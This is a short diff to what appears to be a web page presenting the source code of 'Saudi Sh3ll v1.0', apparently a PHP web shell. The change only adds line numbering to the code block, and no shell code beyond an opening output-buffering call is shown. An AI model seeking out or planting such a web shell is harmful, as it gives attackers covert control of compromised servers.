@@ -17,7 +17,7 @@ Saudi Sh3ll v1.0, by al-swisre
 
 ### Saudi Sh3ll v1.0 Source Code
 
-{% highlight php %}<?
+{% highlight php linenos %}<?
 ob_start();
 ?>
 
